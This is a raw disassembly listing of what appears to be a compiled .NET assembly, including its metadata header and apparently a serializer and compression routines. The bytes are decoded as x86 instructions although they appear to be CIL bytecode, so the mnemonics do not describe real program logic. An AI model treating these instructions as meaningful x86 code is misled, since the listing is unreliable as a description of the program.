  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	c0 1d 00 00 23 53 74 	rcrb   $0x74,0x53230000
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 e8                	add    %ch,%al
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 f4                	add    %dh,%ah
  405a39:	27                   	daa
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 dc                	add    %bl,%ah
  405a41:	63 00                	arpl   %eax,(%eax)
  405a43:	00 10                	add    %dl,(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 ec                	add    %ch,%ah
  405a51:	63 00                	arpl   %eax,(%eax)
  405a53:	00 40 09             	add    %al,0x9(%eax)
  405a56:	00 00                	add    %al,(%eax)
  405a58:	23 42 6c             	and    0x6c(%edx),%eax
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	f4                   	hlt
  405adb:	0a 01                	or     (%ecx),%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 41 19             	add    %al,0x19(%ecx)
  405ae6:	f6 0f 0a             	testb  $0xa,(%edi)
  405ae9:	00 8a 00 0b 16 0a    	add    %cl,0xa160b00(%edx)
  405aef:	00 a7 19 7a 18 0a    	add    %ah,0xa187a19(%edi)
  405af5:	00 91 0f 8d 1d 06    	add    %dl,0x61d8d0f(%ecx)
  405afb:	00 31                	add    %dh,(%ecx)
  405afd:	14 a0                	adc    $0xa0,%al
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 87 08 0b 16 0a    	add    %al,0xa160b08(%edi)
  405b07:	00 aa 10 0b 16 0a    	add    %ch,0xa160b10(%edx)
  405b0d:	00 16                	add    %dl,(%esi)
  405b0f:	18 8d 1d 06 00 01    	sbb    %cl,0x100061d(%ebp)
  405b15:	1a f6                	sbb    %dh,%dh
  405b17:	0f 0e                	femms
  405b19:	00 0d 12 f7 0b 0e    	add    %cl,0xe0bf712
  405b1f:	00 cc                	add    %cl,%ah
  405b21:	18 f7                	sbb    %dh,%bh
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 46 1c             	add    %al,0x1c(%esi)
  405b28:	a0 0b 06 00 31       	mov    0x3100060b,%al
  405b2d:	13 e7                	adc    %edi,%esp
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 67 10             	add    %ah,0x10(%edi)
  405b34:	f6 0f 0a             	testb  $0xa,(%edi)
  405b37:	00 22                	add    %ah,(%edx)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 cb                	add    %cl,%bl
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 a3 15 12 00 01    	add    %ah,0x1001215(%ebx)
  405b4b:	00 f6                	add    %dh,%dh
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	e3 08                	jecxz  0x405b5a
  405b52:	a3 15 06 00 02       	mov    %eax,0x2000615
  405b57:	08 f6                	or     %dh,%dh
  405b59:	0f 06                	clts
  405b5b:	00 ea                	add    %ch,%dl
  405b5d:	0b e7                	or     %edi,%esp
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 ab 14 d0 17 06    	add    %ch,0x617d014(%ebx)
  405b67:	00 a6 05 d0 17 06    	add    %ah,0x617d005(%esi)
  405b6d:	00 ca                	add    %cl,%dl
  405b6f:	0f 66 02             	pcmpgtd (%edx),%mm0
  405b72:	06                   	push   %es
  405b73:	00 f0                	add    %dh,%al
  405b75:	09 a3 15 06 00 5d    	or     %esp,0x5d000615(%ebx)
  405b7b:	0a a3 15 06 00 0d    	or     0xd000615(%ebx),%ah
  405b81:	09 45 15             	or     %eax,0x15(%ebp)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 c3                	add    %al,%bl
  405b87:	15 00 00 06 00       	adc    $0x60000,%eax
  405b8c:	35 09 57 11 06       	xor    $0x6115709,%eax
  405b91:	00 bc 09 57 11 06 00 	add    %bh,0x61157(%ecx,%ecx,1)
  405b98:	9d                   	popf
  405b99:	09 57 11             	or     %edx,0x11(%edi)
  405b9c:	06                   	push   %es
  405b9d:	00 44 0a 57          	add    %al,0x57(%edx,%ecx,1)
  405ba1:	11 06                	adc    %eax,(%esi)
  405ba3:	00 10                	add    %dl,(%eax)
  405ba5:	0a 57 11             	or     0x11(%edi),%dl
  405ba8:	06                   	push   %es
  405ba9:	00 29                	add    %ch,(%ecx)
  405bab:	0a 57 11             	or     0x11(%edi),%dl
  405bae:	06                   	push   %es
  405baf:	00 4c 09 57          	add    %cl,0x57(%ecx,%ecx,1)
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 80 09 57 11 06    	add    %al,0x6115709(%eax)
  405bbb:	00 67 09             	add    %ah,0x9(%edi)
  405bbe:	0e                   	push   %cs
  405bbf:	0c 06                	or     $0x6,%al
  405bc1:	00 21                	add    %ah,(%ecx)
  405bc3:	09 84 15 06 00 f2 08 	or     %eax,0x8f20006(%ebp,%edx,1)
  405bca:	a3 15 06 00 d9       	mov    %eax,0xd9000615
  405bcf:	09 57 11             	or     %edx,0x11(%edi)
  405bd2:	06                   	push   %es
  405bd3:	00 1b                	add    %bl,(%ebx)
  405bd5:	03 a0 0b 06 00 a1    	add    -0x5efff9f5(%eax),%esp
  405bdb:	1b f6                	sbb    %esi,%esi
  405bdd:	0f 06                	clts
  405bdf:	00 99 1a f6 0f 06    	add    %bl,0x60ff61a(%ecx)
  405be5:	00 ee                	add    %ch,%dh
  405be7:	0b e7                	or     %edi,%esp
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 d2                	add    %dl,%dl
  405bed:	1c 0b                	sbb    $0xb,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 21                	add    %ah,(%ecx)
  405bf3:	10 00                	adc    %al,(%eax)
  405bf5:	1d 06 00 ff 12       	sbb    $0x12ff0006,%eax
  405bfa:	00 1d 06 00 81 0b    	add    %bl,0xb810006
  405c00:	00 1d 06 00 fb 11    	add    %bl,0x11fb0006
  405c06:	f6 0f 0a             	testb  $0xa,(%edi)
  405c09:	00 5c 18 66          	add    %bl,0x66(%eax,%ebx,1)
  405c0d:	19 0a                	sbb    %ecx,(%edx)
  405c0f:	00 1f                	add    %bl,(%edi)
  405c11:	1a 66 19             	sbb    0x19(%esi),%ah
  405c14:	0a 00                	or     (%eax),%al
  405c16:	ae                   	scas   %es:(%edi),%al
  405c17:	0e                   	push   %cs
  405c18:	66 19 0a             	sbb    %cx,(%edx)
  405c1b:	00 26                	add    %ah,(%esi)
  405c1d:	1d 7a 18 0a 00       	sbb    $0xa187a,%eax
  405c22:	37                   	aaa
  405c23:	08 7a 18             	or     %bh,0x18(%edx)
  405c26:	0a 00                	or     (%eax),%al
  405c28:	22 08                	and    (%eax),%cl
  405c2a:	7a 18                	jp     0x405c44
  405c2c:	06                   	push   %es
  405c2d:	00 cb                	add    %cl,%bl
  405c2f:	0c f6                	or     $0xf6,%al
  405c31:	0f 06                	clts
  405c33:	00 d4                	add    %dl,%ah
  405c35:	12 f6                	adc    %dh,%dh
  405c37:	0f 06                	clts
  405c39:	00 48 10             	add    %cl,0x10(%eax)
  405c3c:	f6 0f 0a             	testb  $0xa,(%edi)
  405c3f:	00 c3                	add    %al,%bl
  405c41:	17                   	pop    %ss
  405c42:	66 19 0a             	sbb    %cx,(%edx)
  405c45:	00 5d 17             	add    %bl,0x17(%ebp)
  405c48:	66 19 06             	sbb    %ax,(%esi)
  405c4b:	00 e3                	add    %ah,%bl
  405c4d:	17                   	pop    %ss
  405c4e:	f6 0f 06             	testb  $0x6,(%edi)
  405c51:	00 b2 05 f6 0f 0a    	add    %dh,0xa0ff605(%edx)
  405c57:	00 83 0f 7a 18 0a    	add    %al,0xa187a0f(%ebx)
  405c5d:	00 f8                	add    %bh,%al
  405c5f:	0d 8d 1d 0a 00       	or     $0xa1d8d,%eax
  405c64:	40                   	inc    %eax
  405c65:	1b 66 19             	sbb    0x19(%esi),%esp
  405c68:	0a 00                	or     (%eax),%al
  405c6a:	69 11 0b 16 0a 00    	imul   $0xa160b,(%ecx),%edx
  405c70:	81 17 38 11 06 00    	adcl   $0x61138,(%edi)
  405c76:	9d                   	popf
  405c77:	0a f6                	or     %dh,%dh
  405c79:	0f 06                	clts
  405c7b:	00 1c 0e             	add    %bl,(%esi,%ecx,1)
  405c7e:	a0 0b 06 00 ea       	mov    0xea00060b,%al
  405c83:	0d f6 0f 0a 00       	or     $0xa0ff6,%eax
  405c88:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405c89:	0d f6 0f 0a 00       	or     $0xa0ff6,%eax
  405c8e:	ee                   	out    %al,(%dx)
  405c8f:	07                   	pop    %es
  405c90:	f6 0f 06             	testb  $0x6,(%edi)
  405c93:	00 90 14 f6 0f 06    	add    %dl,0x60ff614(%eax)
  405c99:	00 88 1b a0 0b 06    	add    %cl,0x60ba01b(%eax)
  405c9f:	00 c4                	add    %al,%ah
  405ca1:	0f 66 02             	pcmpgtd (%edx),%mm0
  405ca4:	06                   	push   %es
  405ca5:	00 16                	add    %dl,(%esi)
  405ca7:	15 a0 0b 0a 00       	adc    $0xa0ba0,%eax
  405cac:	5c                   	pop    %esp
  405cad:	05 7a 18 06 00       	add    $0x6187a,%eax
  405cb2:	b8 01 f6 0f 06       	mov    $0x60ff601,%eax
  405cb7:	00 25 12 66 02 0a    	add    %ah,0xa026612
  405cbd:	00 54 18 45          	add    %dl,0x45(%eax,%ebx,1)
  405cc1:	15 0a 00 67 12       	adc    $0x1267000a,%eax
  405cc6:	45                   	inc    %ebp
  405cc7:	15 06 00 ef 1c       	adc    $0x1cef0006,%eax
  405ccc:	55                   	push   %ebp
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 72 14             	add    %dh,0x14(%edx)
  405cd2:	66 02 06             	data16 add (%esi),%al
  405cd5:	00 6a 0d             	add    %ch,0xd(%edx)
  405cd8:	66 02 0a             	data16 add (%edx),%cl
  405cdb:	00 bb 06 45 15 06    	add    %bh,0x6154506(%ebx)
  405ce1:	00 38                	add    %bh,(%eax)
  405ce3:	12 66 02             	adc    0x2(%esi),%ah
  405ce6:	0a 00                	or     (%eax),%al
  405ce8:	d9 06                	flds   (%esi)
  405cea:	45                   	inc    %ebp
  405ceb:	15 06 00 6a 1d       	adc    $0x1d6a0006,%eax
  405cf0:	55                   	push   %ebp
  405cf1:	00 16                	add    %dl,(%esi)
  405cf3:	00 07                	add    %al,(%edi)
  405cf5:	17                   	pop    %ss
  405cf6:	e6 02                	out    %al,$0x2
  405cf8:	06                   	push   %es
  405cf9:	00 39                	add    %bh,(%ecx)
  405cfb:	0e                   	push   %cs
